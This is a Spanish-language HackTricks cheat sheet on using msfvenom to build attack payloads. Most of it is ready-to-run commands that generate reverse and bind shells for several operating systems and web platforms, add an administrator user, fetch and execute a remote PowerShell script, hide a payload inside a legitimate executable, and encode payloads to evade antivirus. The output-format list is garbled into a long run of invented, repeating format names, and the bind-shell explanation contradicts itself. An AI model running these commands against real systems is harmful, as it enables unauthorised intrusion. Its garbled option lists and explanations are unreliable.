# MSFVenom - Hoja de trucos

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender más sobre errores web3**

🐞 Lee tutoriales de errores web3

🔔 Recibe notificaciones sobre nuevos programas de recompensas por errores

💬 Participa en discusiones comunitarias

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

También se puede usar `-a` para especificar la arquitectura o `--platform`. 

## Listado
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## Parámetros comunes al crear un shellcode

### `-p` / `--payload`

El parámetro `-p` o `--payload` se utiliza para especificar el payload que se utilizará para crear el shellcode. El payload es el código que se ejecutará en la máquina objetivo después de que se haya explotado la vulnerabilidad.

### `-f` / `--format`

El parámetro `-f` o `--format` se utiliza para especificar el formato de salida del shellcode. Los formatos comunes incluyen `raw`, `c`, `python`, `ruby`, `dll`, `exe`, `msi`, `psh`, `asp`, `jsp`, `war`, `pl`, `elf`, `macho`, `apk`, `osx-app`, `deb`, `rpm`, `jar`, `hta`, `vba`, `vbs`, `js_le`, `js_be`, `php`, `py`, `sh`, `bash`, `powershell`, `powershell_base64`, `powershell_reflective_dll`, `powershell_script_template`, `powershell_script_template_encoded`, `powershell_script_template_compiled`, `powershell_script_template_compiled_x86`, `powershell_script_template_compiled_x64`, `powershell_script_template_compiled_x86_dll`, `powershell_script_template_compiled_x64_dll`, `powershell_script_template_compiled_x86_exe`, `powershell_script_template_compiled_x64_exe`, `powershell_script_template_compiled_x86_msi`, `powershell_script_template_compiled_x64_msi`, `powershell_script_template_compiled_x86_psh`, `powershell_script_template_compiled_x64_psh`, `powershell_script_template_compiled_x86_vba`, `powershell_script_template_compiled_x64_vba`, `powershell_script_template_compiled_x86_vbs`, `powershell_script_template_compiled_x64_vbs`, `powershell_script_template_compiled_x86_wsh`, `powershell_script_template_compiled_x64_wsh`, `powershell_script_template_compiled_x86_js_le`, `powershell_script_template_compiled_x64_js_le`, `powershell_script_template_compiled_x86_js_be`, `powershell_script_template_compiled_x64_js_be`, `powershell_script_template_compiled_x86_php`, `powershell_script_template_compiled_x64_php`, `powershell_script_template_compiled_x86_py`, `powershell_script_template_compiled_x64_py`, `powershell_script_template_compiled_x86_sh`, `powershell_script_template_compiled_x64_sh`, `powershell_script_template_compiled_x86_bash`, `powershell_script_template_compiled_x64_bash`, `powershell_script_template_compiled_x86_powershell`, `powershell_script_template_compiled_x64_powershell`, `powershell_script_template_compiled_x86_powershell_base64`, `powershell_script_template_compiled_x64_powershell_base64`, `powershell_script_template_compiled_x86_powershell_reflective_dll`, `powershell_script_template_compiled_x64_powershell_reflective_dll`, `powershell_script_template_compiled_x86_powershell_script_template`, `powershell_script_template_compiled_x64_powershell_script_template`, `powershell_script_template_compiled_x86_powershell_script_template_encoded`, `powershell_script_template_compiled_x64_powershell_script_template_encoded`, `powershell_script_template_compiled_x86_powershell_script_template_compiled`, `powershell_script_template_compiled_x64_powershell_script_template_compiled`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_dll`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_dll`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_dll`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_dll`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_exe`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_exe`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_exe`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_exe`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_msi`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_msi`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_msi`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_msi`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_psh`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_psh`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_psh`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_psh`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_vba`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_vba`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_vba`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_vba`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_vbs`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_vbs`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_vbs`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_vbs`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_wsh`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_wsh`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_wsh`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_wsh`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_js_le`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_js_le`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_js_le`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_js_le`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_js_be`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_js_be`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_js_be`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_js_be`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_php`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_php`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_py`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_py`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_sh`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_sh`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_sh`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_sh`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_bash`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_bash`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_bash`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_bash`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_powershell`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_powershell`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_powershell`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_powershell`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_powershell_base64`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_powershell_base64`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_powershell_base64`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_powershell_base64`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_powershell_reflective_dll`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_powershell_reflective_dll`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_powershell_reflective_dll`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_powershell_reflective_dll`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_powershell_script_template`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_powershell_script_template`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_powershell_script_template`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_powershell_script_template`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_powershell_script_template_encoded`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_powershell_script_template_encoded`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_powershell_script_template_encoded`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_powershell_script_template_encoded`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_powershell_script_template_compiled`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_powershell_script_template_compiled`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_powershell_script_template_compiled`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_powershell_script_template_compiled`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_powershell_script_template_compiled_x86`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_powershell_script_template_compiled_x86`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_powershell_script_template_compiled_x86`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_powershell_script_template_compiled_x86`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x86_powershell_script_template_compiled_x64`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x86_powershell_script_template_compiled_x64`, `powershell_script_template_compiled_x86_powershell_script_template_compiled_x64_powershell_script_template_compiled_x64`, `powershell_script_template_compiled_x64_powershell_script_template_compiled_x64_powershell_script_template_compiled_x64`.

### `-e` / `--encoder`

El parámetro `-e` o `--encoder` se utiliza para especificar el encoder que se utilizará para codificar el payload. Los encoders se utilizan para evadir la detección de antivirus y otras medidas de seguridad. Los encoders comunes incluyen `shikata_ga_nai`, `x86/shikata_ga_nai`, `alpha_mixed`, `alpha_upper`, `avoid_utf8_tolower`, `call4_dword_xor`, `countdown`, `fnstenv_mov`, `jmp_call_additive`, `nonalpha`, `nonupper`, `polymorphic`, `print_badchars`, `remove_badchars`, `unicode_mixed`, `unicode_upper`, `x86/alpha_mixed`, `x86/alpha_upper`, `x86/avoid_utf8_tolower`, `x86/call4_dword_xor`, `x86/countdown`, `x86/fnstenv_mov`, `x86/jmp_call_additive`, `x86/nonalpha`, `x86/nonupper`, `x86/unicode_mixed`, `x86/unicode_upper`.

### `-a` / `--arch`

El parámetro `-a` o `--arch` se utiliza para especificar la arquitectura de la máquina objetivo. Las arquitecturas comunes incluyen `x86`, `x64`, `x86_64`, `armle`, `armbe`, `aarch64`, `mipsle`, `mipsbe`, `ppc`, `ppc64`, `sparc`, `sparc64`.

### `-b` / `--bad-chars`

El parámetro `-b` o `--bad-chars` se utiliza para especificar los caracteres que no se deben incluir en el shellcode. Los caracteres comunes que se deben evitar incluyen `\x00`, `\x0a`, `\x0d`, `\x20`.

### `-n` / `--nopsled`

El parámetro `-n` o `--nopsled` se utiliza para especificar el tamaño del nopsled que se utilizará en el shellcode. El nopsled es una serie de instrucciones `NOP` que se utilizan para deslizar el shellcode en la memoria y asegurarse de que se ejecuta correctamente.
```bash
-b "\x00\x0a\x0d" 
-f c 
-e x86/shikata_ga_nai -i 5 
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## **Windows**

### **Shell Inverso**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Shell de Enlace
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Crear Usuario
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### Shell CMD
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Ejecutar Comando**

---

#### **Descripción**

La opción `CMD` de `msfvenom` permite ejecutar un comando en la máquina objetivo después de que se haya ejecutado el payload.

#### **Sintaxis**

```
msfvenom -p <payload> CMD='<command>' [...]
```

#### **Ejemplo**

El siguiente comando generará un payload de Meterpreter que ejecutará el comando `whoami` en la máquina objetivo después de que se haya ejecutado el payload:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f exe -o payload.exe CMD='whoami'
```
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Codificador
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### Incrustado dentro de un ejecutable
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Cargas útiles de Linux

### Shell Inverso
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Shell de Enlace
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)

SunOS (Solaris) es un sistema operativo basado en Unix desarrollado por Sun Microsystems. Es utilizado en servidores y estaciones de trabajo de alta gama. Para generar payloads para Solaris, se puede utilizar el siguiente comando de msfvenom:
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **Cargas útiles de MAC**

### **Shell inverso:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Shell de enlace**

A Bind Shell es un tipo de shell inversa en la que el objetivo es conectarse a la máquina que ejecuta el shell. En lugar de que el shell se conecte a un puerto en el atacante, el atacante se conecta a un puerto en la víctima y el shell se ejecuta en ese puerto. Esto significa que el shell está "enlazado" al puerto en la víctima y está esperando una conexión entrante.

Para crear un shell de enlace con msfvenom, se utiliza el siguiente comando:

```
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

Donde `<payload>` es el payload que se utilizará, `<attacker IP>` es la dirección IP del atacante, `<attacker port>` es el puerto en el que el atacante está escuchando y `<format>` es el formato de salida deseado (por ejemplo, exe, elf, o raw). `<output file>` es el archivo de salida que se creará.

Por ejemplo, para crear un shell de enlace de Windows en formato exe que se conecte al atacante en la dirección IP 192.168.0.100 en el puerto 4444, se utilizaría el siguiente comando:

```
msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.100 LPORT=4444 -f exe -o bind_shell.exe
```
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Cargas útiles basadas en la web**

### **PHP**

#### Shell inverso
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Shell inversa
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Shell inversa
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Shell Inverso
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS

NodeJS es una plataforma de software de código abierto que se utiliza para construir aplicaciones de red escalables. Está construido sobre el motor V8 de Google Chrome y utiliza un modelo de E/S sin bloqueo y orientado a eventos, lo que lo hace ideal para aplicaciones en tiempo real con una gran cantidad de datos que cambian con frecuencia. NodeJS también es muy popular en el desarrollo de aplicaciones web y se utiliza a menudo en combinación con frameworks como ExpressJS.
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Cargas útiles de lenguaje de script**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**

Python es un lenguaje de programación interpretado de alto nivel que se utiliza ampliamente en el hacking. Es fácil de aprender y tiene una gran cantidad de bibliotecas y módulos que lo hacen muy versátil. Python se utiliza para escribir scripts de automatización, herramientas de hacking y exploits. También se utiliza para el análisis de datos y la visualización de datos. Algunas de las bibliotecas más populares de Python para el hacking son `requests`, `beautifulsoup`, `scapy`, `pandas` y `numpy`.
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

Bash es un lenguaje de scripting muy popular en sistemas Unix y Linux. Es una herramienta muy útil para la automatización de tareas y la creación de scripts personalizados. Bash también se utiliza a menudo para la creación de shellcodes y payloads.

Una de las ventajas de Bash es que está disponible en la mayoría de los sistemas Unix y Linux, lo que lo hace muy accesible para los hackers. Además, Bash es muy flexible y puede ser utilizado para una amplia variedad de tareas, desde la creación de scripts simples hasta la creación de herramientas de hacking avanzadas.

Msfvenom es una herramienta muy útil para la creación de payloads de Bash. Con Msfvenom, los hackers pueden crear payloads personalizados que pueden ser utilizados para una amplia variedad de tareas, desde la explotación de vulnerabilidades hasta la creación de backdoors.

Para crear un payload de Bash con Msfvenom, primero debemos especificar el tipo de payload que queremos crear. Luego, debemos especificar la dirección IP y el puerto que queremos utilizar para la conexión de backdoor. Finalmente, debemos especificar el formato de salida que queremos utilizar para el payload.

Una vez que hemos creado nuestro payload de Bash con Msfvenom, podemos utilizarlo para la creación de backdoors y la explotación de vulnerabilidades en sistemas Unix y Linux.
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender más sobre errores web3**

🐞 Lee tutoriales sobre errores web3

🔔 Recibe notificaciones sobre nuevos programas de recompensas por errores

💬 Participa en discusiones de la comunidad

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
